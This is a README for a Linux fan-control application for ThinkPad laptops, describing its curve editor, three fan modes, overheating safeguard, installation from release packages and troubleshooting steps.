# 🧊 thinkpad-fan-control - Keep your laptop cool and quiet

[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Jayneaural77/thinkpad-fan-control/releases)

This software helps you manage the fan speed of your ThinkPad laptop. It keeps your device cool during heavy tasks and silent when you work. It uses a graph to show you how fast the fan spins at different temperatures. You control the fan through three modes: manual, automatic, and BIOS.

The software runs in the background to watch your hardware temperatures. It adjusts fan speeds smoothly to prevent loud noise jumps. A safety guard stops the system from overheating if your manual settings get too low.

## ⚙️ How it works

The program runs as a system service. It tracks the internal temperature sensors on your circuit board. When the temperature moves past the points you set on the graph, the fan reacts. 

The software includes a graphics window. You drag points on a line to tell the software how to behave. If you move a point up, the fan spins faster. If you move it down, the fan stays quiet. You can save these settings so the program remembers them every time you turn your computer on.

## 📥 Getting the software

1. Go to the [official release page](https://github.com/Jayneaural77/thinkpad-fan-control/releases).
2. Look for the recent version at the top of the list.
3. Click the link that ends in ".deb" or ".tar.gz" depending on your Linux version. 
4. Save the file to your "Downloads" folder.

## 🚀 Setting up the application

1. Open your terminal or file manager after the download finishes.
2. If you use Ubuntu or Debian, double-click the .deb file to install it. 
3. If you use another version of Linux, follow the instructions in the text file inside the downloaded folder.
4. Type your password when the computer asks for permission to change system files.
5. Wait for the loading bar to finish.
6. Open your application menu. 
7. Search for "ThinkPad Fan Control" and click the icon.

## 🛠 Using the interface

When you open the application, you see a graph. The bottom axis represents temperature in degrees Celsius. The left axis represents fan speed as a percentage. 

You can drag the dots on the line to pick the fan speed for each temperature. If you want the computer to run cool, drag the points toward the top left. If you want the computer to stay quiet for as long as possible, drag the points toward the right.

### Selecting a mode

The program offers three distinct modes:

* **Automatic:** The software follows the curve you drew on the screen.
* **Manual:** You set a specific fan speed that stays the same until you change it.
* **BIOS:** You hand full control back to the computer firmware. This is the default setting for most laptops.

## 📋 System requirements

* Any ThinkPad laptop released after 2015.
* Linux operating system with kernel 5.0 or newer.
* Standard Python 3 installation.
* Permission to modify system thermal settings.
* At least 50 megabytes of free space.

## 🛡 Staying safe

The program includes a safeguard. Even if you pick a manual fan speed that is too low, the software watches the processor temperature. If the temperature hits a dangerous level, the software ignores your manual setting and spins the fan to maximum speed. This protects your computer parts from heat damage. You see a warning icon if this happens.

## 🔍 Troubleshooting common issues

If the software does not change the fan speed, check these items:

1. **Permissions:** Ensure you installed the software as an administrator. 
2. **Compatibility:** Some older ThinkPad models do not support thermal control through Linux. Check if your laptop model is in the supported list on our wiki.
3. **Other tools:** Do not run other fan control software at the same time. These programs conflict with each other. Disable or remove other fan tools before you start this one.
4. **Firmware:** Update your BIOS to the latest version provided by your device manufacturer. This fixes communication errors between the hardware and the software.

## 📝 Reporting bugs

If the software crashes or fails to adjust the fan, look at the logs. You find these files in the folder where the program resides. Send these logs to the developer through the issue tracker on the website. Include your laptop model number and your Linux distribution name. This helps find a fix for your specific hardware configuration.

## 🏗 Understanding the curve

The curve creates a relationship between temperature and noise. A steep slope means the fan speed jumps quickly. A flat slope gives you a steady fan speed across many temperatures. Most users prefer a gentle slope. This provides a balance between heat dispersal and fan noise. You can reset your curve to the default settings at any time by clicking the "Reset" button inside the menu.

## 💻 Working with Wayland

If you use a modern Linux desktop like GNOME or KDE with Wayland, the interface works as expected. The software detects your display settings automatically. You do not need to change any window manager settings. The scaling of the graph adjusts to your screen resolution to ensure you see all controls properly.

## 🔋 Battery management

The software consumes very little power. It wakes up once every few seconds to check the temperature. It spends most of its time in a sleep state. This ensures it does not impact your battery life while you work away from the charger. You can monitor the CPU usage of the fan control process in your system monitor. It should stay near zero percent.